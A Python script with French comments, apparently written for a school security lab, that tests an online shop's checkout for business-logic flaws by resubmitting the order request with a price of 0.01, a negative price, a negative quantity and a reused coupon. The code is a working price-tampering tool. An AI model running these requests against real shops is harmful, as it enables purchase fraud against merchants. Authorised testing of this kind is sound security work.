#!/usr/bin/env python3
"""
Testeur de failles de logique métier sur le paiement / panier.

⚠️ USAGE : uniquement sur le lab d'entraînement fourni par l'école,
   sur lequel tu es explicitement autorisé à faire ces tests.

Principe : le script rejoue la requête de validation de commande en
modifiant un paramètre à la fois, puis regarde si le SERVEUR accepte
la valeur manipulée (prix, quantité, code promo, etc.). Si oui → faille.

À adapter avec les infos de TON lab (section CONFIG ci-dessous).
Dépendance :  pip install requests
"""

import requests

# ───────────────────────────── CONFIG ──────────────────────────────
# À remplir avec les valeurs observées dans l'onglet Network de Chrome.
BASE_URL        = "http://LAB_DE_TON_ECOLE"      # ex: http://10.0.0.5:8080
CHECKOUT_PATH   = "/checkout"                      # endpoint de validation
SESSION_COOKIE  = {"session": "COLLE_TON_COOKIE"}  # cookie de session du lab

# Nom des champs tels qu'ils apparaissent DANS LA REQUÊTE réelle du lab.
FIELD_PRICE     = "price"
FIELD_QUANTITY  = "quantity"
FIELD_COUPON    = "coupon"

# Un panier "normal" valide, copié depuis la vraie requête.
PANIER_NORMAL = {
    "product_id": "1",
    FIELD_PRICE:    "49.99",
    FIELD_QUANTITY: "1",
}
# ────────────────────────────────────────────────────────────────────


def envoyer(payload):
    """Envoie une commande et renvoie (code HTTP, extrait de réponse)."""
    r = requests.post(
        BASE_URL + CHECKOUT_PATH,
        data=payload,
        cookies=SESSION_COOKIE,
        timeout=10,
    )
    return r.status_code, r.text[:300]


def verdict(nom, accepte):
    etat = "⚠️  VULNÉRABLE (accepté)" if accepte else "✅  OK (rejeté)"
    print(f"[{nom:<22}] {etat}")


def test_prix_modifie():
    """Le serveur accepte-t-il un prix fixé par le client ?"""
    p = dict(PANIER_NORMAL)
    p[FIELD_PRICE] = "0.01"
    code, corps = envoyer(p)
    # À adapter : ici on suppose qu'un code 200 + "success" = commande acceptée.
    verdict("Prix modifié", code == 200 and "success" in corps.lower())


def test_prix_negatif():
    """Un prix négatif peut-il générer un avoir ?"""
    p = dict(PANIER_NORMAL)
    p[FIELD_PRICE] = "-100"
    code, corps = envoyer(p)
    verdict("Prix négatif", code == 200 and "success" in corps.lower())


def test_quantite_negative():
    """Une quantité négative est-elle acceptée ?"""
    p = dict(PANIER_NORMAL)
    p[FIELD_QUANTITY] = "-5"
    code, corps = envoyer(p)
    verdict("Quantité négative", code == 200 and "success" in corps.lower())


def test_coupon_rejoue():
    """Un même code promo peut-il être appliqué plusieurs fois ?"""
    p = dict(PANIER_NORMAL)
    p[FIELD_COUPON] = "REMISE10"
    envoyer(p)                      # 1re application
    code, corps = envoyer(p)        # 2e application du même code
    verdict("Coupon rejoué", code == 200 and "success" in corps.lower())


if __name__ == "__main__":
    print("=== Tests de logique métier (paiement) ===\n")
    print("Référence (panier normal) :", envoyer(PANIER_NORMAL)[0], "\n")
    test_prix_modifie()
    test_prix_negatif()
    test_quantite_negative()
    test_coupon_rejoue()
    print("\nNote : adapte la détection de succès (verdict) à la réponse "
          "réelle de ton lab avant de conclure.")
